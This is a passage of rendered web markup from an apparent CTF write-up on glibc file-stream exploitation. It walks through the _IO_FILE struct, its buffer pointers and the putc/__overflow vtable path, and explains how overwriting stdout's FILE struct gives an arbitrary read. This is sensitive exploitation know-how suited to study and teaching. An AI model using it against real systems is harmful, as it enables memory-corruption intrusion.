\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_FILE\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_chain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" _fileno\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" _flags2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  __off_t _old_offset\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* This used to be _offset but it\\u2019s too small.  */\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* 1+column number of pbase(); 0 is unknown. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"short\"}),\" _cur_column\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"signed\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" _vtable_offset\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" _shortbuf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  _IO_lock_t \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_lock\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  __off64_t _offset\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Wide character stream stuff.  */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_codecvt\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_codecvt\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_wide_data\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_wide_data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_FILE\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_freeres_list\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_freeres_buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),\" __pad5\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" _mode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Make sure we don\\u2019t get into trouble again.  */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" _unused2\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"sizeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"sizeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"sizeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This struct has several fields, several managing \",(0,n.jsx)(e.em,{children:\"buffering\"}),\". That function, that every CTF challenge (including this one), \",(0,n.jsx)(e.code,{children:\"setbuf\"}),\", is a function that updates fields in this struct. Buffering is a great speedup, since calling syscalls every time you want to write a character to the screen, sequentially, is \",(0,n.jsx)(e.em,{children:\"slow\"}),'. It\\u2019s much faster to just write to a buffer for a bit, and eventually flush that buffer to the file descriptor. It might be feasible to hijack what these buffers are doing, and get a \"read what where\" primative out of it!']}),`\n`,(0,n.jsx)(e.p,{children:\"Let\\u2019s view each fields and disect them:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Current read pointer */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_read_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of putback+get area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of put area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Current put pointer. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_write_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of put area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Start of reserve area. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\"\t\",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* End of reserve area. */\"}),`\n`]})]})}),`\n`,(0,n.jsx)(e.p,{children:'These fields are somewhat self explanitory: an IO FILE struct maintains pointers to buffers that hold read and write information, specifically denotating where a \"cursor\" is in each buffer, and where those buffers end. The buffering structure can somewhat be visualized like below. However, often these structures can overlap depending on what is happening with the file descriptor.'}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`[a a a a a a a _ _ _ _ _ _ _ b b b b b b b c _ _ _ _ _ _ _ ]\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:` ^             ^           ^ ^                 ^         ^\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:` read_base     read_ptr    read_end\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`                             write_base        write_ptr write_end\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:` buf_base                                                buf_end\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We have fields \",(0,n.jsx)(e.code,{children:\"int _flags\"}),\", \",(0,n.jsx)(e.code,{children:\"int _fileno\"}),\", \",(0,n.jsx)(e.code,{children:\"__off64_t _offset\"}),\", \",(0,n.jsx)(e.code,{children:\"FILE* _chain\"}),\", \",(0,n.jsx)(e.code,{children:\"char _vtable_offset\"}),\":\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"flags\"}),\" is all of the flags that this file descriptor uses, its meant to only be 32 bits, and the top 2 bytes are set to \",(0,n.jsx)(e.code,{children:\"_IO_MAGIC\"}),\" or \",(0,n.jsx)(e.code,{children:\"0xFBAD0000\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"fileno\"}),\" is the actual, integer file descriptor for this \",(0,n.jsx)(e.code,{children:\"FILE\"}),\".\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"offset\"}),\" is the byte offset within the file (used for seeking and such).\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"chain\"}),\" is a pointer to the next \",(0,n.jsx)(e.code,{children:\"FILE*\"}),\", as they are all managed in a singly-linked list.\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"vtable_offset\"}),\" is the offset selector of which vtable we should use for this file pointer. A vtable is a struct containing function ptrs, so that it\\u2019s easy to share functions between different structs.\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"So what exactly do we have to do? For starters, if you\\u2019ve used \",(0,n.jsx)(e.code,{children:\"fgets()\"}),\" or other functions, then the \",(0,n.jsx)(e.code,{children:\"FILE*\"}),\" for \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" is already defined and called \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" when you use it in your code (compared to \",(0,n.jsx)(e.code,{children:\"STDOUT_FILENO\"}),\" referring to the file descriptor). libc stores a reference to the \",(0,n.jsx)(e.code,{children:\"FILE stdout\"}),\" in a symbol: \",(0,n.jsx)(e.code,{children:\"_IO_2_1_stdout_\"}),\". Which means, using the arbitrary write primative we built earlier with botcake, we can instead write to the file struct for stdout. But what do we write? We can easily set the flags and buffers to whatever we need, but how does give us an aribtrary read?\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Well, with buffering, eventually \",(0,n.jsx)(e.code,{children:\"stdout\"}),\" has to flush the buffer and whatever is in it to the terminal. If we can set up the flags and the buffers in such a way that both prints out \",(0,n.jsx)(e.code,{children:\"environ\"}),\", without breaking \",(0,n.jsx)(e.code,{children:\"stdout\"}),\", we have a working arbitrary read primative. I\\u2019m heavily following \",(0,n.jsx)(e.a,{href:\"https://ret2school.github.io/post/catastrophe/\",children:\"ret2school\"}),\" at this point, adding my own explainations when necessary.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"For core functions like \",(0,n.jsx)(e.code,{children:\"putc\"}),\", there are cases where it will instead flush the buffer and print something else. One of the macros in the \",(0,n.jsx)(e.code,{children:\"FILE.h\"}),\" struct definition is the following:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"__putc_unlocked_body\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\t\t\t\t\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"__glibc_unlikely\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"?\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__overflow\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\t\t\t\"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_fp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"++\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This macro is called by \",(0,n.jsx)(e.code,{children:\"fputc\"}),\" and \",(0,n.jsx)(e.code,{children:\"putchar\"}),\" (the latter, used with stdout). This checks to see if the file pointer\\u2019s write ptr is at or past the end of the write buffer. If so, then we call this \",(0,n.jsx)(e.code,{children:\"__overflow\"}),\" function, otherwise, we write the character to the current position of the write ptr and increment (Recall that postfix \",(0,n.jsx)(e.code,{children:\"++\"}),\" returns the value before incrementing, I love C).\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Alright, \",(0,n.jsx)(e.code,{children:\"__overflow\"}),\" will likely flush the buffer, so our first condition is to make the \",(0,n.jsx)(e.code,{children:\"write_ptr\"}),\" equal the \",(0,n.jsx)(e.code,{children:\"write_end\"}),\". Let\\u2019s take a look at \",(0,n.jsx)(e.code,{children:\"__overflow\"}),\" to see what else we need to consider:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token function\",children:\"__overflow\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FILE \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* This is a single-byte stream.  */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"_mode \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_fwide\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_OVERFLOW\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can assume \",(0,n.jsx)(e.code,{children:\"_mode\"}),\" for stdout is assumed to be non-zero (since it\\u2019s not a single byte stream) This means we should look at \",(0,n.jsx)(e.code,{children:\"_IO_OVERFLOW\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/libioP.h#L146\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"_IO_OVERFLOW\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" CH\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"JUMP1\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"__overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" FP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" CH\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"// Ok so let\\u2019s look at JUMP1: FUNC=__overflow, THIS=stdout, X1=our character\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/libioP.h#L124\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"JUMP1\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FUNC\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" X1\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_JUMPS_FUNC\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\u003e\"}),\"FUNC\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" X1\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"// Oh jeez: Ok so this grabs the corresponding vtable IO_jump_t, based off of the offset, and the previous macro dereferences the correct function...\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"//libio/libioP.h#L107\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),\" \",(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"_IO_JUMPS_FUNC\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"THIS\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"IO_validate_vtable                                                   \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"_IO_jump_t\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token 